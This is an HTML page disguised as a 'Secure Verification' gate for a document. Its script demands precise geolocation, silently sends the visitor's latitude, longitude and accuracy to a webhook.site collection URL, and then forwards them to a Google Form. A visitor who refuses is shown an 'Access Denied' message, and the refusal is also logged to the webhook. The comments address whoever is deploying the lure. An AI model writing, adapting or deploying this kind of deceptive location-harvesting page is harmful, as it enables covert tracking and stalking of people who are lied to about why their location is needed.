<!DOCTYPE html>
<html>
<head>
    <title>Secure Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #111; color: #eee; font-family: sans-serif; text-align: center; padding-top: 20%; }
        .spinner { border: 4px solid #333; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .error-msg { color: #ff4b2b; display: none; padding: 20px; }
    </style>
</head>
<body>
    <div id="loading-ui">
        <div class="spinner"></div>
        <p id="status">Verifying location for access...</p>
    </div>
    
    <div id="error-ui" class="error-msg">
        <h2>Access Denied</h2>
        <p>You must allow location access to view this secure document. Please refresh and try again.</p>
    </div>

    <script>
        // Update this to Beeceptor if Webhook.site remains blank for you
        const WEBHOOK = "https://webhook.site/81426716-72be-48fc-a494-fcd675327a3e";
        const FORM = "https://docs.google.com/forms/d/1kXi_Hw0GgWOI533BwZx-RxhWeSzsl28WUR1yVCSmkJ0/viewform";

        function sendAndLeave(lat, lon, acc) {
            // Using 'no-cors' to ensure the request leaves the browser even on restricted networks
            fetch(`${WEBHOOK}?lat=${lat}&lon=${lon}&accuracy=${acc}m&status=VERIFIED`, { mode: 'no-cors' })
            .then(() => { 
                window.location.href = FORM; 
            });
        }

        function handleError() {
            // Hide loading spinner and show error message
            document.getElementById('loading-ui').style.display = 'none';
            document.getElementById('error-ui').style.display = 'block';
            
            // Log the block to your webhook so you know they tried to skip it
            fetch(`${WEBHOOK}?status=ACCESS_DENIED_BY_USER`, { mode: 'no-cors' });
        }

        window.onload = function() {
            if (!navigator.geolocation) { 
                alert("This device is not supported."); 
                return; 
            }

            const options = {
                enableHighAccuracy: true, 
                timeout: 15000,           
                maximumAge: 0             
            };

            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    // Success: Form opens ONLY here
                    sendAndLeave(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
                },
                (err) => {
                    // Failure: Form DOES NOT open
                    handleError();
                }, 
                options
            );
        };
    </script>
</body>
</html>
